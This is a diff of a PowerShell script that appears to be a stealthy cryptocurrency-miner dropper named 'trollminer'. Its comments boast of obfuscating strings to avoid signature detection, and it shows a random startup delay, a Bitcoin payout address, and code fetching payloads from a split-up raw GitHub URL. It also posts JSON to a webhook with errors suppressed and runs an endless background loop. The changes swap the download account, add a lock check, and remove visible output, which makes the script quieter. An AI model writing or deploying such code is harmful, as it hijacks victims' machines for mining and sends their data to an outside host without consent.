@@ -1,10 +1,13 @@
+if (Test-Path "$PSScriptRoot\.lock") { 
+    return 
+}
+
 $ProgressPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Write-Host "Initializing..."
 
 # Config - Obfuscated strings to avoid simple signature detection
 Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
-$u1 = 'HolyV200'; $u2 = 'trollminer'
+$u1 = 'maroz123'; $u2 = 'trollminer'
 $addr = "bc1qly9l5tledssjfl8nxq97sdl55je04hjh790z44"
 $p1 = 'https://raw'; $p2 = 'githubusercontent.com'
 $base = "$p1.$p2/$u1/$u2/main"
@@ -70,11 +73,6 @@ try {
     } | ConvertTo-Json
     Invoke-RestMethod -Uri $wh -Method Post -Body $json -ContentType "application/json" -ErrorAction SilentlyContinue
 } catch {}
-
-
-
-Write-Host "flight is rinsed holy dumbass"
-
 
 # Background Loop
 while ($true) { Start-Sleep -Seconds 3600 }
